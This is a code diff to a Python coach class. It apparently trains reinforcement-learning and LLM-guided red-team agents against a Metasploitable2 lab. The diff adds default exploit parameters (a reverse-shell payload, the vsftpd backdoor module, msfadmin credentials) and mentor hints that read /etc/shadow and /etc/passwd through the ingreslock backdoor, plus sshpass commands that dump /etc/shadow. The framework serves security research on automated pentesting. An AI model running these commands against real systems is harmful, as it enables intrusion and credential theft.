@@ -199,7 +199,7 @@ class SmartCoach:
         "RedAgent": {
             "role": "offensive",
             "description": "⚔️ Offensive Operations - exploitation, brute force, active attacks",
-            "primary_phases": [AttackPhase.EXPLOITATION, AttackPhase.PRIVILEGE_ESCALATION],
+            "primary_phases": [AttackPhase.EXPLOITATION, AttackPhase.PRIVILEGE_ESCALATION, AttackPhase.POST_EXPLOITATION],
             "preferred_commands": [
                 # EXCLUSIVE to Red - Exploitation and brute force
                 "searchsploit", "sqlmap_get", "sqlmap_post", "sqlmap_crawl",
@@ -793,19 +793,84 @@ class SmartCoach:
         )
     
     def _get_default_param(self, param: str, ctx: "AttackContext") -> str:
-        """Get default value for a required parameter."""
+        """Get default value for a required parameter.
+
+        Provides sensible defaults for ALL known command template parameters.
+        The fallback for truly unknown params is the target IP, but every
+        param name used in the 144+ command registry should be listed here
+        to avoid mis-substitution (e.g. ports or lport getting an IP value).
+        """
+        # MS2 common ports for scan-type commands
+        ms2_ports = "21,22,23,25,80,139,445,512,513,514,1099,1524,2049,3306,5432,5900,6667,8180"
+        # Attacker IP — same subnet as target, .1 gateway convention
+        parts = ctx.target.rsplit(".", 1)
+        attacker_ip = f"{parts[0]}.1" if len(parts) == 2 else "172.28.0.1"
+
         defaults = {
+            # ─── Target identifiers ──────────────────────────────
             "target": ctx.target,
             "ip": ctx.target,
             "host": ctx.target,
+            "rhost": ctx.target,
+            "rhosts": ctx.target,
+            "target_range": f"{ctx.target}/24",
             "url": f"http://{ctx.target}",
-            "port": "80",
-            "wordlist": "/usr/share/wordlists/dirb/common.txt",
-            "user": "admin",
-            "username": "admin",
-            "password": "password",
             "domain": ctx.target,
+            "subnet": parts[0] if len(parts) == 2 else "172.28.0",
+            # ─── Ports ───────────────────────────────────────────
+            "port": "80",
+            "ports": ms2_ports,
+            "rport": "445",
+            "lport": "4444",
+            "num_ports": "100",
+            "rate": "5000",
+            # ─── Attacker / listener ─────────────────────────────
+            "lhost": attacker_ip,
+            "attacker": attacker_ip,
+            # ─── Credentials ─────────────────────────────────────
+            "user": "msfadmin",
+            "username": "msfadmin",
+            "password": "msfadmin",
+            "userlist": "/usr/share/wordlists/metasploit/unix_users.txt",
+            "passlist": "/usr/share/wordlists/metasploit/unix_passwords.txt",
+            # ─── Wordlists ───────────────────────────────────────
+            "wordlist": "/usr/share/wordlists/dirb/common.txt",
+            # ─── Metasploit / payloads ───────────────────────────
+            "module": "exploit/unix/ftp/vsftpd_234_backdoor",
+            "payload": "linux/x86/shell_reverse_tcp",
+            "format": "elf",
+            "output": "/tmp/payload.elf",
+            # ─── SMB / NFS / LDAP ────────────────────────────────
+            "share": "tmp",
+            "export": "/",
+            "mountpoint": "/tmp/nfs_mount",
+            "base_dn": "dc=metasploitable,dc=local",
+            "community": "public",
+            "version": "2c",
+            # ─── SSH / auth ──────────────────────────────────────
+            "keyfile": "/root/.ssh/id_rsa",
+            "hash": "",
+            # ─── Web form / injection ────────────────────────────
+            "post_data": "username=admin&password=admin",
+            "form_path": "/login",
+            "form_data": "username=^USER^&password=^PASS^",
+            "fail_string": "Invalid",
+            # ─── Scanning / enumeration ──────────────────────────
+            "query": "exploit",
+            "enumerate": "vp,vt,u",
+            "templates": "cves/",
+            "severity": "medium,high,critical",
+            "extensions": "php,html,txt,bak",
+            "threads": "10",
+            "token": "",
+            # ─── Exfiltration / post-exploit ─────────────────────
+            "path": "/etc/",
+            "file": "/etc/shadow",
+            "remote_path": "/tmp/loot/",
+            "command": f"/bin/bash -c 'id'",
+            "public_key": "ssh-rsa AAAA_placeholder_key root@attacker",
         }
+        # Fallback: only use target IP for truly target-like unknown params
         return defaults.get(param, ctx.target)
     
     def decide(
@@ -920,7 +985,7 @@ class SmartCoach:
         # Early episodes: mentor leads, PPO observes (builds demonstration buffer).
         # Later episodes: PPO leads, mentor only called on uncertainty/stagnation.
         # The crossover is controlled by a dynamic mentor_lead_rate that fades
-        # from 80% to 5% as PPO builds confidence.
+        # from 35% to 15% as PPO builds confidence (Phase 6.5 tuning).
         # 
         # Decision priority: Skill Library → Playbook → (Mentor OR PPO) → Registry
         if skill_result is not None:
@@ -928,10 +993,10 @@ class SmartCoach:
         elif playbook_result is not None:
             result = playbook_result
         else:
-            # Phase 6.4: Compute dynamic mentor_lead_rate
-            # Starts at 80%, decays to 5% over episodes. PPO confidence
-            # (measured by explained_variance and entropy) accelerates the decay.
-            base_mentor_rate = max(0.05, 0.80 - self.current_episode * 0.015)
+            # Phase 6.5: Compute dynamic mentor_lead_rate
+            # Starts at 35%, decays to 15% over ~50 episodes.
+            # PPO confidence (low entropy) accelerates the decay.
+            base_mentor_rate = max(0.15, 0.35 - self.current_episode * 0.004)
             
             # Accelerate decay if PPO is learning well (low entropy = confident)
             ppo_confidence_boost = 0.0
@@ -942,9 +1007,9 @@ class SmartCoach:
                     avg_entropy = sum(recent_entropy[-5:]) / max(len(recent_entropy[-5:]), 1)
                     max_entropy = self.ppo_agent.config.entropy_coef * 10  # rough max
                     if max_entropy > 0:
-                        ppo_confidence_boost = max(0, 0.2 * (1.0 - avg_entropy / max_entropy))
+                        ppo_confidence_boost = max(0, 0.10 * (1.0 - avg_entropy / max_entropy))
             
-            effective_mentor_rate = max(0.05, base_mentor_rate - ppo_confidence_boost)
+            effective_mentor_rate = max(0.15, base_mentor_rate - ppo_confidence_boost)
             
             # Roll dice: mentor leads vs PPO leads
             import random as _rand
@@ -963,8 +1028,9 @@ class SmartCoach:
                     orig_model = self.model
                     self.model = mentor_engagement.model
                     _exfil_hint = (
-                        "Focus on data exfiltration techniques. Try: cat /etc/shadow, "
-                        "find / -name '*.conf', mysqldump, pg_dump, tar critical files."
+                        "Focus on data exfiltration via ingreslock backdoor. Try: "
+                        "{ echo 'cat /etc/shadow'; sleep 2; } | timeout 10 telnet target 1524, "
+                        "{ echo 'base64 /etc/passwd'; sleep 2; } | timeout 10 telnet target 1524."
                     ) if getattr(mentor_engagement, 'exfil_guidance', False) else None
                     result = self._decide_with_mentor(
                         step_ctx, proposed_action, confidence, filtered_commands,
@@ -1014,8 +1080,9 @@ class SmartCoach:
                         orig_model = self.model
                         self.model = mentor_engagement.model
                         _exfil_hint2 = (
-                            "Focus on data exfiltration techniques. Try: cat /etc/shadow, "
-                            "find / -name '*.conf', mysqldump, pg_dump, tar critical files."
+                            "Focus on data exfiltration via ingreslock backdoor. Try: "
+                            "{ echo 'cat /etc/shadow'; sleep 2; } | timeout 10 telnet target 1524, "
+                            "{ echo 'base64 /etc/passwd'; sleep 2; } | timeout 10 telnet target 1524."
                         ) if getattr(mentor_engagement, 'exfil_guidance', False) else None
                         mentor_result = self._decide_with_mentor(
                             step_ctx, proposed_action, confidence, filtered_commands,
@@ -1072,19 +1139,19 @@ class SmartCoach:
         # PPO decisions are still exempt (they have pre-selection masking).
         # =========================================================================
         all_cmds = ctx.command_history if ctx.command_history else []
-        result_prefix = result.command.split()[0].lower() if result.command else ""
+        result_prefix = self._extract_tool_prefix(result.command) if result.command else ""
         result_cmd_norm = result.command.strip() if result.command else ""
         
         # Count in ENTIRE episode history
         exact_repeat_count = sum(1 for c in all_cmds if c.strip() == result_cmd_norm)
         prefix_repeat_count = sum(1 for c in all_cmds 
-                                   if c.strip().split()[0].lower() == result_prefix)
+                                   if self._extract_tool_prefix(c) == result_prefix)
         
         # Determine action family for this command
         family = self._get_action_family(result_prefix)
         family_count = sum(
             1 for c in all_cmds
-            if self._get_action_family(c.strip().split()[0].lower() if c.strip() else "") == family
+            if self._get_action_family(self._extract_tool_prefix(c)) == family
         )
         
         # Graded penalty tracking (stored on result for reward calculator)
@@ -1189,6 +1256,30 @@ class SmartCoach:
                     "rkhunter", "lynis", "osquery"},
     }
     
+    @staticmethod
+    def _extract_tool_prefix(cmd: str) -> str:
+        """Extract the actual tool name from a command, handling piped compound commands.
+        
+        For regular commands like 'nmap -sV target', returns 'nmap'.
+        For piped ingreslock commands like '{ echo ...; } | timeout 10 telnet target 1524',
+        returns 'telnet' (the actual tool after the pipe).
+        """
+        cmd = cmd.strip()
+        if not cmd:
+            return ""
+        # Handle { echo ...; } | timeout N tool target port
+        if cmd.startswith("{"):
+            pipe_idx = cmd.find("|")
+            if pipe_idx >= 0:
+                after_pipe = cmd[pipe_idx + 1:].strip()
+                parts = after_pipe.split()
+                # Skip 'timeout N' if present
+                if len(parts) >= 3 and parts[0] == "timeout":
+                    return parts[2].lower()
+                elif parts:
+                    return parts[0].lower()
+        return cmd.split()[0].lower()
+
     def _get_action_family(self, cmd_prefix: str) -> str:
         """Classify a command prefix into an action family."""
         for family, tools in self.ACTION_FAMILIES.items():
@@ -1242,6 +1333,8 @@ class SmartCoach:
                 f"wpscan --url http://{target} --plugins-detection aggressive",
                 f"curl -s http://{target}:8180/manager/html",
                 f"mysql -h {target} -u root -e 'show databases' 2>/dev/null",
+                f"sshpass -p msfadmin ssh -o StrictHostKeyChecking=no -o HostKeyAlgorithms=+ssh-rsa msfadmin@{target} 'id; cat /etc/shadow'",
+                f"sshpass -p msfadmin ssh -o StrictHostKeyChecking=no -o HostKeyAlgorithms=+ssh-rsa msfadmin@{target} 'echo msfadmin | sudo -S cat /etc/shadow'",
             ],
             "stealth": [
                 f"nc -zv {target} 1524 2>&1",
@@ -1274,8 +1367,8 @@ class SmartCoach:
         }
         
         alts = alternative_commands.get(role_name, alternative_commands["recon"])
-        used_prefixes = set(c.strip().split()[0].lower() for c in all_cmds if c.strip())
-        available = [cmd for cmd in alts if cmd.split()[0].lower() not in used_prefixes]
+        used_prefixes = set(self._extract_tool_prefix(c) for c in all_cmds if c.strip())
+        available = [cmd for cmd in alts if self._extract_tool_prefix(cmd) not in used_prefixes]
         if not available:
             available = alts.copy()
             random.shuffle(available)
@@ -2023,30 +2116,53 @@ class SmartCoach:
         episode = self.current_episode
 
         # Adaptive Curriculum: performance-based annealing
-        # Base rate decays with time; performance modulates it
-        base_prob = max(0.10, 0.60 - episode * 0.01)
+        # Base rate starts HIGH (90%) — playbooks are critical for bootstrapping
+        # fresh PPO networks with good commands before RL learns
+        base_prob = max(0.15, 0.90 - episode * 0.015)
         perf = self._get_curriculum_performance()
         if perf > 0.7:
             # Agent doing well — anneal faster, less hand-holding
-            playbook_prob = max(0.05, base_prob * 0.5)
+            playbook_prob = max(0.10, base_prob * 0.5)
         elif perf < 0.3:
             # Agent struggling — keep guidance higher
-            playbook_prob = min(0.80, base_prob * 1.5)
+            playbook_prob = min(0.95, base_prob * 1.3)
         else:
             playbook_prob = base_prob
         if random.random() > playbook_prob:
             return None
 
         # Get playbooks for target profile
+        # Map generic difficulty labels to actual target profiles
         target_profile = getattr(ctx, 'difficulty', 'generic') or 'generic'
+        if target_profile in ("medium", "easy", "hard"):
+            # Detect MS2 target by IP range
+            target_ip = getattr(ctx, 'target', '')
+            if target_ip and ('172.28.0' in target_ip or '192.168.56' in target_ip):
+                target_profile = "metasploitable2"
+            else:
+                target_profile = "generic"
         playbooks = get_playbooks_for_target(target_profile)
         if not playbooks:
             playbooks = get_playbooks_for_target("generic")
         if not playbooks:
             return None
 
-        # Filter playbooks relevant to this role's phases
-        role_phases = [p.name.lower() for p in self.agent_role.get("primary_phases", [])]
+        # Map AttackPhase enum names to playbook phase names
+        # Playbooks use shortened names: "exploit", "privesc", "exfiltrate"
+        # but AttackPhase.name.lower() gives: "exploitation", "privilege_escalation", "exfiltration"
+        _PHASE_TO_PLAYBOOK = {
+            "recon": "recon",
+            "enumeration": "enumeration",
+            "exploitation": "exploit",
+            "privilege_escalation": "privesc",
+            "lateral_movement": "lateral_movement",
+            "post_exploitation": "post_exploitation",
+            "exfiltration": "exfiltrate",
+        }
+        role_phases = [
+            _PHASE_TO_PLAYBOOK.get(p.name.lower(), p.name.lower())
+            for p in self.agent_role.get("primary_phases", [])
+        ]
 
         # Try each playbook for a matching next step
         completed = [d.template_name for d in self.decisions]
@@ -2055,17 +2171,43 @@ class SmartCoach:
             if not any(rp in pb.phases_covered for rp in role_phases):
                 continue
 
-            next_step = get_next_playbook_command(pb.name, completed)
-            if next_step is None:
+            # Get ALL remaining uncompleted steps from this playbook,
+            # then find the first one that matches this agent's role.
+            # This prevents Scout-only steps from blocking Red's playbook usage.
+            completed_set = set(completed)
+            matched_step = None
+            for step in pb.steps:
+                if step.command in completed_set:
+                    continue
+                # Check dependencies — only enforce deps that are in THIS role's
+                # command pool. Cross-role deps (e.g., Red needs Scout's nmap)
+                # are assumed met by the other agent.
+                if step.depends_on:
+                    own_deps = []
+                    for d in step.depends_on:
+                        if self.action_mapper:
+                            dep_idx = self.action_mapper.command_to_action(d)
+                            if dep_idx >= 0:
+                                # This dep IS in our pool — must be completed
+                                own_deps.append(d)
+                            # else: cross-role dep, skip check
+                        else:
+                            own_deps.append(d)
+                    if not all(d in completed_set for d in own_deps):
+                        continue
+                # Check if command is in this role's action mapper
+                if self.action_mapper:
+                    idx = self.action_mapper.command_to_action(step.command)
+                    if idx < 0:
+                        continue  # Skip steps not in this role's pool
+                # Found a matching step for this role
+                matched_step = step
+                break
+
+            if matched_step is None:
                 continue
 
-            # Check if this command belongs to this role's mapper
-            if self.action_mapper:
-                idx = self.action_mapper.command_to_action(next_step.command)
-                if idx < 0:
-                    continue  # Command not in this role's pool
-
-            template = COMMAND_REGISTRY.get(next_step.command)
+            template = COMMAND_REGISTRY.get(matched_step.command)
             if not template:
                 continue
 
@@ -2081,7 +2223,7 @@ class SmartCoach:
                 continue
 
             logger.debug(
-                f"[PLAYBOOK][{self.agent_name}] {pb.name} → {next_step.command} "
+                f"[PLAYBOOK][{self.agent_name}] {pb.name} → {matched_step.command} "
                 f"(prob={playbook_prob:.0%}, ep={episode})"
             )
 
@@ -2090,7 +2232,7 @@ class SmartCoach:
                 template_name=template.name,
                 params=params,
                 mentor_call=False,
-                mentor_reasoning=f"📚 Playbook[{pb.name}] → {next_step.description[:40]}",
+                mentor_reasoning=f"📚 Playbook[{pb.name}] → {matched_step.description[:40]}",
                 confidence=0.75,
                 phase=template.phase,
                 source="playbook",
@@ -2417,6 +2559,22 @@ class SmartCoach:
             if mentor_response.command in ctx.command_history[-5:]:
                 logger.warning(f"[{self.agent_name}] LLM suggested exact repeat command - forcing registry fallback")
                 return self._decide_from_registry(step_ctx, proposed_action, confidence)
+            
+            # ─── FIX: Substitute any remaining {param} placeholders ─────
+            # Mentor often returns raw templates like "ssh {username}@target"
+            # Apply _get_default_param() to fill in missing values
+            final_command = mentor_response.command
+            import re as _re
+            placeholder_pattern = _re.compile(r'\{(\w+)\}')
+            placeholders = placeholder_pattern.findall(final_command)
+            if placeholders:
+                for param_name in placeholders:
+                    default_val = self._get_default_param(param_name, ctx)
+                    if default_val and not default_val.startswith('{'):
+                        final_command = final_command.replace(f'{{{param_name}}}', default_val)
+                if final_command != mentor_response.command:
+                    logger.debug(f"[{self.agent_name}] Mentor param substitution: {mentor_response.command[:60]} → {final_command[:60]}")
+                    mentor_response.command = final_command
             
             # Track command in history
             ctx.command_history.append(mentor_response.command)
